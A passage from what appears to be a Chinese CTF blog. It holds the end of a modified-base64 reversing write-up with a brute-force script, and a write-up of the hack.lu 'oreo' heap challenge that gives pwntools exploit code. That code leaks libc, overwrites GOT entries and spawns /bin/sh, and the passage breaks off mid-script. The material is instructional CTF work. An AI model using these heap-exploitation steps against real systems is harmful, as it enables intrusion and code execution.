class="number">00403160</span> ; <span class="keyword">char</span> changed_base64_table[]</span><br><span class="line">.rdata:00403160 changed_base64_table db 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/abcdefghijklmnopqrstuvwxyz',0</span><br></pre></td></tr></table></figure><p>本身这个<code>base64_table</code>就已经是被改过的，这下还要进行移位，也就相当于这次<code>base64_encode</code>真正用的表为<code>OPQRSTUVWXYZ0123456789+/abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMN</code></p><h2 id="GetIndexString"><a href="#GetIndexString" class="headerlink" title="GetIndexString"></a>GetIndexString</h2><p>要看懂这个函数在干什么的话，<strong>一定!一定!一定!要先理解base64算法</strong>，网上有很多详解，这里不再叙述。</p><p>这个函数主要就是模拟base64加密时获取索引的操作，</p><p>然后执行 <code>索引的值+32 --&gt; ascii --&gt; 字符</code>(虽然字符在内存中也是以二进制形式存在，但是这样描述大概能方便理解) ， 并把字符依次拼接形成字符串，最后返回这个字符串。</p><p>提取出来主要算法如下:</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">v6 = <span class="number">0</span></span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">  first = *(_BYTE *)(v7 - <span class="number">1</span>);</span><br><span class="line">  v7 += <span class="number">3</span>;</span><br><span class="line">  second = *(_BYTE *)(v7 - <span class="number">3</span>);</span><br><span class="line">  v5[v6] = (first &gt;&gt; <span class="number">2</span>) + <span class="number">32</span>;</span><br><span class="line">  v5[v6 + <span class="number">1</span>] = ((second &gt;&gt; <span class="number">4</span>) + <span class="number">32</span>) | <span class="number">16</span> * (first &amp; <span class="number">3</span>);</span><br><span class="line">  v10 = thired &gt;&gt; <span class="number">6</span>;</span><br><span class="line">  v5[v6 + <span class="number">3</span>] = (thired &amp; <span class="number">0x3F</span>) + <span class="number">32</span>;</span><br><span class="line">  v5[v6 + <span class="number">2</span>] = (v10 | <span class="number">4</span> * (second &amp; <span class="number">0xF</span>)) + <span class="number">32</span>;</span><br><span class="line">  v6 += <span class="number">4</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> ( v6 &lt; v15 );</span><br></pre></td></tr></table></figure><p>不过还是有两点非常细节的地方!</p><p><strong>首先</strong>，获取到索引的时候，进行了 <code>+32</code> 的操作</p><p><strong>其次</strong>，<code>v5[v6+1]</code>也就是每组(每四个一组)索引中的第二个索引与每组中的其他三个索引不同。</p><p>其他三个索引，是按照<code>base64_encode</code>算法求出以后再进行<code>+32</code>操作</p><p>但第二个索引</p><p><code>v5[v6 + 1] = ((second &gt;&gt; 4) + 32) | 16 * (first &amp; 3);</code></p><p>是取了每组(每三个一组)待加密字符串中第二个字符的前四位<strong>加上32</strong>以后与<code>16 * (first &amp; 3)</code>进行或运算。</p><p>而并非按照<code>base64_encode</code>原本的算法先求出<code>(second &gt;&gt; 4) | 16 * (first &amp; 3)</code> ，然后再按照程序的意愿进行+32</p><h3 id="隐含的问题"><a href="#隐含的问题" class="headerlink" title="隐含的问题"></a>隐含的问题</h3><p>这样就会导致一个问题:</p><p>说白了就是由于这个程序进行的是<code>((second &gt;&gt; 4) + 32) | 16 * (first &amp; 3)</code>操作，导致每组索引中的第二个索引从左向右第三位(算上为了补齐8位而在开头补的2个0)总会是1。</p><p>因此在逆这个算法的时候需要对其分情况讨论，<strong>讨论还原真正的<code>IndexString</code>的时候是否需要减去32</strong></p><p>下面举两种情况来说明：</p><h4 id="情况一"><a href="#情况一" class="headerlink" title="情况一"></a>情况一</h4><p>假设我们待加密的字符串为<code>Gwn</code></p><p>其二进制表示为<code>01000111 01110111 01101110</code></p><p>用first表示第一个字符，用second表示第二个字符。</p><p><code>((second &gt;&gt; 4) + 32)</code> == <code>100111</code></p><p><code>16 * (first &amp; 3)</code> == <code>110000</code></p><p><code>((second &gt;&gt; 4) + 32) | 16 * (first &amp; 3)</code> == <code>110111</code></p><p>而</p><p><code>((second &gt;&gt; 4))</code> == <code>000111</code></p><p><code>16 * (first &amp; 3)</code> == <code>110000</code></p><p><code>((second &gt;&gt; 4)) | 16 * (first &amp; 3)</code> == <code>110111</code></p><p>通过上述可以发现，如果每组待加密字符串的第一个字符的从左往右第7位为1，也就是获取的每组索引中的第二个索引的从左往右第3位(因为前2位要补0形成8位byte类型)为1</p><p>那么就有<code>((second &gt;&gt; 4) + 32) | 16 * (first &amp; 3)</code>就<strong>等于</strong><code>((second &gt;&gt; 4)) | 16 * (first &amp; 3)</code></p><h4 id="情况二"><a href="#情况二" class="headerlink" title="情况二"></a>情况二</h4><p>但如果我们待加密的字符串为<code>Ewn</code>呢?</p><p>其二进制表示为<code>01000101 01110111 01101110</code></p><p>用first表示第一个字符，用second表示第二个字符。</p><p><code>((second &gt;&gt; 4) + 32)</code> == <code>100111</code></p><p><code>16 * (first &amp; 3)</code> == <code>010000</code></p><p><code>((second &gt;&gt; 4) + 32) | 16 * (first &amp; 3)</code> == <code>110111</code></p><p>而</p><p><code>((second &gt;&gt; 4))</code> == <code>000111</code></p><p><code>16 * (first &amp; 3)</code> == <code>010000</code></p><p><code>((second &gt;&gt; 4)) | 16 * (first &amp; 3)</code> == <code>010111</code> == <code>(((second &gt;&gt; 4) + 32) | 16 * (first &amp; 3))-32</code></p><p>也就是说如果每组待加密字符串的第一个字符的从左往右第7位为0，也就是获取的每组索引中的第二个索引的从左往右第3位(因为前2位要补0形成8位byte类型)为0</p><p>那么就有<code>((second &gt;&gt; 4) + 32) | 16 * (first &amp; 3)</code>就<strong>等于</strong><code>(((second &gt;&gt; 4)) | 16 * (first &amp; 3)) + 32</code></p><h1 id="0x02-思路"><a href="#0x02-思路" class="headerlink" title="0x02 思路"></a>0x02 思路</h1><p>由程序用于对比的字符串<code>8&amp;]Z:&amp;)&amp;=%$T+3%4,6PU:#1M544Q5$,]</code></p><p>想办法还原出真正的<code>IndexString</code>,这里可以考虑爆破,毕竟真正需要爆破的是每组(每四个一组)中的第二个索引中的从左向右第3位(按总共8位来算)，这个字符串长度32，需要爆破8个位置，每个位置2种情况，最多需要爆破2的8次方即256次。爆破成功与否需要看能否正常解密得到flag。</p><p>还原出真正的<code>IndexString</code>以后，也就得到了正确的索引，也就可以根据索引按照真正的base64加密算法得到一个base64串，然后进行base64decode，就得到了我们input进行程序的<code>changed_base64_encode</code>后的结果。</p><p>然后对这个结果进行base64换表decode即可得到flag。</p><h1 id="0x03-解密脚本"><a href="#0x03-解密脚本" class="headerlink" title="0x03 解密脚本"></a>0x03 解密脚本</h1><p>比较菜，目前只想出了用随机数进行爆破和直接套8次for循环的爆破，8次for循环太麻烦了，这里用的随机数。</p><p>应该还有更好的爆破方法吧</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">s = <span class="string">'8&amp;]Z:&amp;)&amp;=%$T+3%4,6PU:#1M544Q5$,]'</span></span><br><span class="line">base_table = <span class="string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'</span></span><br><span class="line">changed_base_table = <span class="string">"OPQRSTUVWXYZ0123456789+/abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMN"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        tmp = <span class="string">''</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(s),<span class="number">4</span>):</span><br><span class="line">            tmp += base_table[(ord(s[i])<span class="number">-32</span>)]</span><br><span class="line">            rand = random.choice([<span class="number">0</span>, <span class="number">32</span>])</span><br><span class="line">            tmp += base_table[(ord(s[i+<span class="number">1</span>])-rand)]</span><br><span class="line">            tmp += base_table[(ord(s[i+<span class="number">2</span>])<span class="number">-32</span>)]</span><br><span class="line">            tmp += base_table[(ord(s[i+<span class="number">3</span>])<span class="number">-32</span>)]</span><br><span class="line">        base = tmp.decode(<span class="string">'base64'</span>)</span><br><span class="line">        flag = base64.b64decode(base.translate(string.maketrans(changed_base_table, base_table)))</span><br><span class="line">        <span class="keyword">if</span> flag[<span class="number">0</span>:<span class="number">5</span>] == <span class="string">'flag&#123;'</span> <span class="keyword">and</span> flag[<span class="number">-1</span>] == <span class="string">'&#125;'</span>:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">'[+] Get flag!  flag = '</span> + flag</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br></pre></td></tr></table></figure><p>爆破的话能爆破出来好几种解，比如:</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag&#123;BAsE&gt;4aBB64&#125;</span><br><span class="line">flag&#123;BAsE&gt;4_BB64&#125;</span><br><span class="line">flag&#123;BAsE64aBB64&#125;</span><br><span class="line">flag&#123;BAsE64_BB64&#125;</span><br></pre></td></tr></table></figure><p>经过测试，这些都能通过程序的验证。</p><h1 id="0x04-写在最后"><a href="#0x04-写在最后" class="headerlink" title="0x04 写在最后"></a>0x04 写在最后</h1><p>主办方在群里发过一段解密脚本，但是程序strcmp的那个字符串与这个程序有些许差别。</p><p>大概这个程序是经过改编的，而且我感觉上面分析的那个+32的问题，应该是改编时没注意括号导致的?</p><p>不过这道题目还是挺有意思的，考察对base64算法的具体理解，单单会用Python或者其他语言里面现有的encode与decode还是不够的。</p><p><strong>如果有人看到了这篇博客并且想到了更好的爆破方法，希望能够教教弟弟。</strong></p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/illust_74791242_20190810_124117.png" alt></p>]]></content>
      <categories>
        <category>逆向</category>
      </categories>
  </entry>
  <entry>
    <title>[Fastbin Attack] 2014 hack.lu oreo</title>
    <url>/2020/02/20/Fastbin-Attack-2014-hack-lu-oreo/</url>
    <content><![CDATA[<p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/1.png" alt></p><a id="more"></a><h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>这是一道<code>CTF-WIKI</code>对于<code>Fastbin Attack</code>的一道例题，本题利用的技术:<code>堆溢出、Fastbin Attack、Arbitrary Alloc</code></p><p>参考链接:</p><p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/fastbin_attack-zh/" target="_blank" rel="noopener">CTF-WIKI</a></p><p><a href="https://bbs.pediy.com/thread-247214.htm" target="_blank" rel="noopener">看雪</a></p><p>这里感谢看雪论坛和CTF-WIKI的师傅的详细讲解。</p><p>题目下载地址:<a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/fastbin-attack/2014_hack.lu_oreo" target="_blank" rel="noopener">下载地址</a></p><h1 id="0x01-分析"><a href="#0x01-分析" class="headerlink" title="0x01 分析"></a>0x01 分析</h1><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">Arch:     i386<span class="number">-32</span>-little</span><br><span class="line">RELRO:    No RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      <span class="function">No <span class="title">PIE</span> <span class="params">(<span class="number">0x8048000</span>)</span></span></span><br></pre></td></tr></table></figure><h2 id="程序功能及漏洞分析"><a href="#程序功能及漏洞分析" class="headerlink" title="程序功能及漏洞分析"></a>程序功能及漏洞分析</h2><p>程序有6个基本功能</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span> Add <span class="keyword">new</span> rifle</span><br><span class="line"><span class="number">2.</span> Show added rifles</span><br><span class="line"><span class="number">3.</span> Order selected rifles</span><br><span class="line"><span class="number">4.</span> Leave a Message with your Order</span><br><span class="line"><span class="number">5.</span> Show current stats</span><br><span class="line"><span class="number">6.</span> Exit!</span><br></pre></td></tr></table></figure><p>在<code>功能1. Add</code>中</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">add</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *v1; <span class="comment">// [esp+18h] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v2; <span class="comment">// [esp+1Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  v1 = buf;</span><br><span class="line">  buf = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x38</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( buf )</span><br><span class="line">  &#123;</span><br><span class="line">    *((_DWORD *)buf + <span class="number">13</span>) = v1;                 <span class="comment">//NextChunk指针</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Rifle name: "</span>);</span><br><span class="line">    fgets(buf + <span class="number">25</span>, <span class="number">56</span>, <span class="built_in">stdin</span>);</span><br><span class="line">    sub_80485EC(buf + <span class="number">25</span>);                      <span class="comment">// 将末尾换行符转换为\x00</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Rifle description: "</span>);</span><br><span class="line">    fgets(buf, <span class="number">56</span>, <span class="built_in">stdin</span>);</span><br><span class="line">    sub_80485EC(buf);</span><br><span class="line">    ++riflesNum;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Something terrible happened!"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到,两次fgets都存在堆溢出，我们的name大小为27字节，description大小为25字节，但是却都允许输入56字节。</p><p>堆块最后四个字节存放的是指向下一个堆块的指针，记为next。</p><p>可以通过输入name来覆盖掉next。</p><p>当前步枪总数riflesNum位于bss段。</p><ul><li><p><code>功能2show rifles</code>能打印出当前添加的<code>所有</code>步枪的name和description</p></li><li><p><code>功能3order rifles</code>能够free掉<code>所有</code>add时申请的chunk，但是却没有置为NULL</p></li><li><p><code>功能4leave message</code>能够向<code>0x0804A2A8</code>处的指针<code>所指向</code>的地址写入128个字节，注意这里是不是往<code>0x0804A2A8</code>位置写数据，而是往<code>0x0804A2A8</code>里面存的指针所指向的位置写128个字节的数据。</p></li><li><p><code>功能5show stats</code>能够打印出当前add的数量和order的数量以及message(如果有的话)</p></li><li><p><code>功能6 Exit</code>退出程序</p></li></ul><p>分析完程序的功能了，可以发现漏洞点存在于add函数(堆溢出)和order函数(没置NULL)中。</p><p>这里我们主要利用add函数里面的堆溢出，配合Fastbin Attack、Arbitrary Alloc。</p><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>既然我们能够通过堆溢出覆盖掉next指针，那我们可以把next覆盖成任意值，也就能指向任意位置，也就能通过<code>2.show函数</code>打印出任意位置的内容，实现任意读。</p><p>我们可以先通过这种这任意读来泄露libc地址，从而获得system函数地址。</p><p>而我们的<code>4. leave message</code>函数能够向<code>0x0804A2A8</code>处的指针<code>所指向</code>的地址写入128个字节，那么我们可以想办法修改<code>0x0804A2A8</code>处的指针，然后就能实现任意写。</p><p>可以通过这任意写来修改一些函数的got表，将其修改为system，进而想办法执行system(‘/bin/sh’)，从而getshell。</p><p>这里还会有一些细节，等下会说。</p><h1 id="0x02-Let’s-do-it"><a href="#0x02-Let’s-do-it" class="headerlink" title="0x02 Let’s do it!"></a>0x02 Let’s do it!</h1><h2 id="前期模板"><a href="#前期模板" class="headerlink" title="前期模板"></a>前期模板</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">c = process(<span class="string">'./oreo'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./oreo'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/i386-linux-gnu/libc.so.6'</span>)</span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(name,des)</span>:</span></span><br><span class="line">    <span class="comment">#c.recvuntil('Action',timeout = 0.5)</span></span><br><span class="line">    c.sendline(<span class="string">'1'</span>)</span><br><span class="line">    <span class="comment">#c.recvuntil('Rifle name',timeout = 0.5)</span></span><br><span class="line">    c.sendline(name)</span><br><span class="line">    <span class="comment">#c.recvuntil('Rifle description',timeout = 0.5)</span></span><br><span class="line">    c.sendline(des)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">showrifles</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment">#c.recvuntil('Action: ',timeout = 0.5)</span></span><br><span class="line">    c.sendline(<span class="string">'2'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">order</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment">#c.recvuntil('Action: ')</span></span><br><span class="line">    c.sendline(<span class="string">'3'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leavemsg</span><span class="params">(msg)</span>:</span></span><br><span class="line">    <span class="comment">#c.recvuntil('Action: ')</span></span><br><span class="line">    c.sendline(<span class="string">'4'</span>)</span><br><span class="line">    <span class="comment">#c.recvuntil('with your order: ')</span></span><br><span class="line">    c.sendline(msg)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">showstatus</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment">#c.recvuntil('Action: ')</span></span><br><span class="line">    c.sendline(<span class="string">'5'</span>)</span><br><span class="line"></span><br><span class="line">message = <span class="number">0x0804a2a8</span></span><br></pre></td></tr></table></figure><p>比较诡异的是，如果加上了c.recvuntil，哪怕已经加上了timeout，程序也会卡住….看各位大佬的WP里面都没加recvuntil… 迷惑行为…</p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/%HUKKYNYN5$OP0~5E3H~EK2.jpg" alt></p><h2 id="Leak-libcbase"><a href="#Leak-libcbase" class="headerlink" title="Leak libcbase"></a>Leak libcbase</h2><p>这里我们选择puts函数来进行泄露，这里有两个细节：</p><p>第一：</p><p>我们进行泄露的原理是： add一个步枪，通过堆溢出覆盖它的next为puts_got，然后show。</p><p>也就是说，这样程序会把从puts_got开始的0x38个字节当做一个chunk，而由add函数申请的chunk最后四个字节是代表next的，我们需要确保我们所选择的用来泄露的函数其got表对应next的位置（也就是从这个函数got表开始的0x35~0x38字节的位置）的内容应该是0，这样当我们order(也就是delete)的时候，不会有多余的堆块被释放。</p><p>第二：</p><blockquote><p>根据linux延迟绑定机制，只有第一次运行后got表才会绑定该函数的实际内存地址</p></blockquote><p>这里比较幸运，puts函数满足我们上面所说的小细节，而且程序一开始就已经调用过puts了。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Leak </span></span><br><span class="line">puts_got = elf.got[<span class="string">'puts'</span>]</span><br><span class="line"></span><br><span class="line">des = <span class="string">'a'</span>*<span class="number">25</span></span><br><span class="line">name = <span class="string">'a'</span>*<span class="number">27</span> + p32(puts_got)</span><br><span class="line">add(name,des)</span><br><span class="line">showrifles()</span><br><span class="line"></span><br><span class="line">c.recvuntil(<span class="string">'Description: '</span>)</span><br><span class="line">c.recvuntil(<span class="string">'Description: '</span>)</span><br><span class="line">puts_addr = u32(c.recv(<span class="number">4</span>).ljust(<span class="number">4</span>,<span class="string">'\x00'</span>))</span><br><span class="line">log.success(<span class="string">'puts_addr = '</span> + hex(puts_addr))</span><br><span class="line">libcbase = puts_addr - libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line">system = libcbase + libc.symbols[<span class="string">'system'</span>]</span><br></pre></td></tr></table></figure><h2 id="想办法修改0x0804A2A8位置所存的指针"><a href="#想办法修改0x0804A2A8位置所存的指针" class="headerlink" title="想办法修改0x0804A2A8位置所存的指针"></a>想办法修改0x0804A2A8位置所存的指针</h2><p>我们可以通过把0x0804A2A8附近伪造成一个chunk，然后利用<code>Arbitrary alloc</code>技术修改其存放的指针。</p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200220035545.png" alt></p><p>可以发现在 0x0804A2A8 - 4 = 0x0804A2A4 的位置存放的正好是当前add的步枪的总数</p><p>而正常的chunk(32位)，在data区-4的位置，存放的正好就是chunk的size</p><p>由于<code>Arbitrary alloc</code>技术必然要先经过free掉这个伪造chunk，而程序的add功能申请的chunk的大小是0x38,加上chunk_head就是0x40大小，那么我们就把这个伪造chunk的size也设置成0x40就好了，设置的方法也很简单，总共add 40次就行了。</p><p>这里有个<code>细节</code>：为了我们执行order函数时不把那些不必要的chunk也都free进fastbin，我们把这些为了凑数而申请的chunk的next都覆盖成0</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0x40</span> - <span class="number">1</span> - <span class="number">1</span>):</span><br><span class="line">    add(<span class="string">'a'</span>*<span class="number">27</span> + p32(<span class="number">0</span>) ,str(i))</span><br></pre></td></tr></table></figure><p>注意这里 0x40-1-1，因为最开始已经add了一个了，而且待会我们还要再add一个起关键功能的chunk，所以这里是0x40-1-1</p><p>我们还需要一个chunk来指向我们的伪造chunk，不然执行order的时候…伪造chunk不会被free进fastbin</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">'b'</span>*<span class="number">27</span> + p32(message)</span><br><span class="line">add(payload,<span class="string">'b'</span>)</span><br></pre></td></tr></table></figure><p>算上刚刚这个，正好0x40个。</p><p>由于<code>Arbitrary alloc</code>技术还需要和伪造chunk物理相邻的下一个chunk的size满足不能小于 <code>2 * SIZE_SZ</code>，同时也不能大于<code>av-&gt;system_mem</code>，我们来看</p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200220040800.png" alt></p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200220040824.png" alt></p><p>0x0804A2A8的位置在最开始存的指针是指向0x0804A2C0的，那么我们可以先leave message来修改伪造chunk的nextchunk（实际上这也是个伪造chunk，不是个真的chunk..）的size</p><p>0x0804A2C0 - 0x0804A2A8 = 24，也就是说有24个字节的间隔。</p><p>而伪造chunk的大小是0x38</p><p>我们0x38 - 24 = 0x20，我们只需要写0x20字节来先填充伪造chunk，然后就能修改nextchunk的prevsize和size了。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">msg = <span class="string">'a'</span>*((<span class="number">0x38</span> - (<span class="number">0xc0</span> - <span class="number">0xa8</span>)) - <span class="number">4</span>) <span class="comment">#padding</span></span><br><span class="line">msg += p32(<span class="number">0</span>) <span class="comment">#fake_chunk's nextPtr</span></span><br><span class="line">msg += <span class="string">'prev'</span> <span class="comment">#prev_size</span></span><br><span class="line">msg += p32(<span class="number">64</span>) <span class="comment">#nextchunk's size </span></span><br><span class="line">leavemsg(msg)</span><br></pre></td></tr></table></figure><p>这个size只要满足不能小于 <code>2 * SIZE_SZ</code>，同时也不能大于<code>av-&gt;system_mem</code>就行。</p><p>构造完毕，我们来order一下</p><p>order函数比较巧妙，它会先free掉我们第0x40个add的chunk，然后根据第0x40个chunk的next找到我们的fakechunk再free掉，然后依次根据next找下去，可惜我们构造的fakechunk的next为0，这样方便再malloc。</p><p>来看一下结果</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; fastbin</span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x10</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x18</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x28</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x38</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x804a2a0</span> —▸ <span class="number">0x804d3d0</span> ◂— <span class="number">0x0</span></span><br></pre></td></tr></table></figure><p>可以看到我们伪造的fakechunk已经进入fastbin了，当我们再次add的时候会在原位置得到这个堆块，进而可以修改里面的内容。 咱们的目的是修改0x0804A2A8位置存放的指针。</p><p>为了方便getshell，我们这里选择了strlen函数，因为在sub_80485EC这个函数里面调用了它，比较好利用。</p><p>那么我们把0x0804A2A8存放的指针改成strlen_got吧</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = p32(elf.got[<span class="string">'strlen'</span>])</span><br><span class="line">add(<span class="string">'padding'</span>,payload)</span><br></pre></td></tr></table></figure><h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><p>然后我们把<code>strlen</code>改成<code>system</code>吧</p><p>这里有大佬一气呵成，修改成<code>system</code>的同时也给它传入了参数<code>/bin/sh</code>,因为<code>leavemessage函数</code>里面也用了<code>strlen函数</code>这是我目前凭自己想不到的一点，还是太菜了。。。</p><p>先列一下大佬的方法吧</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">leavemsg(p32(system) + <span class="string">';/bin/sh\x00'</span>)</span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><p>而我的方法比较笨一些，先将<code>strlen</code>修改成<code>system</code>，然后再<code>add</code>一个，在name或者description位置传入<code>/bin/sh</code></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">leavemsg(p32(system))</span><br><span class="line"></span><br><span class="line">add(<span class="string">'/bin/sh\x00'</span>,<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><h1 id="0x03-完整EXP"><a href="#0x03-完整EXP" class="headerlink" title="0x03 完整EXP"></a>0x03 完整EXP</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">c = process(<span class="string">'./oreo'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./oreo'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/i386-linux-gnu/libc.so.6'</span>)</span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(name,des)</span>:</span></span><br><span class="line">    <span class="comment">#c.recvuntil('Action',timeout = 0.5)</span></span><br><span class="line">    c.sendline(<span class="string">'1'</span>)</span><br><span class="line">    <span class="comment">#c.recvuntil('Rifle name',timeout = 0.5)</span></span><br><span class="line">    c.sendline(name)</span><br><span class="line">    <span class="comment">#c.recvuntil('Rifle description',timeout = 0.5)</span></span><br><span class="line">    c.sendline(des)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">showrifles</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment">#c.recvuntil('Action: ',timeout = 0.5)</span></span><br><span class="line">    c.sendline(<span class="string">'2'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">order</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment">#c.recvuntil('Action: ')</span></span><br><span class="line">    c.sendline(<span class="string">'3'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leavemsg</span><span class="params">(msg)</span>:</span></span><br><span class="line">    <span class="comment">#c.recvuntil('Action: ')</span></span><br><span class="line">    c.sendline(<span class="string">'4'</span>)</span><br><span class="line">    <span class="comment">#c.recvuntil('with your order: ')</span></span><br><span class="line">    c.sendline(msg)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">showstatus</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment">#c.recvuntil('Action: ')</span></span><br><span class="line">    c.sendline(<span class="string">'5'</span>)</span><br><span class="line"></span><br><span class="line">message = <span class="number">0x0804a2a8</span></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">puts_got = elf.got[<span class="string">'puts'</span>]</span><br><span class="line"></span><br><span class="line">des = <span class="string">'a'</span>*<span class="number">25</span></span><br><span class="line">name = <span class="string">'a'</span>*<span class="number">27</span> + p32(puts_got)</span><br><span class="line">add(name,des)</span><br><span class="line">showrifles()</span><br><span class="line"></span><br><span class="line">c.recvuntil(<span class="string">'Description: '</span>)</span><br><span class="line">c.recvuntil(<span class="string">'Description: '</span>)</span><br><span class="line">puts_addr = u32(c.recv(<span class="number">4</span>).ljust(<span class="number">4</span>,<span class="string">'\x00'</span>))</span><br><span class="line">log.success(<span class="string">'puts_addr = '</span> + hex(puts_addr))</span><br><span class="line">libcbase = puts_addr - libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line">system = libcbase + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0x40</span> - <span class="number">1</span> - <span class="number">1</span>):</span><br><span class="line">    add(<span class="string">'a'</span>*<span class="number">27</span> + p32(<span class="number">0</span>) ,str(i))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'b'</span>*<span class="number">27</span> + p32(message)</span><br><span class="line">add(payload,<span class="string">'b'</span>)</span><br><span class="line"></span><br><span class="line">msg = <span class="string">'a'</span>*((<span class="number">0x38</span> - (<span class="number">0xc0</span> - <span class="number">0xa8</span>)) - <span class="number">4</span>) + p32(<span class="number">0</span>) + <span class="string">'prev'</span> + p32(<span 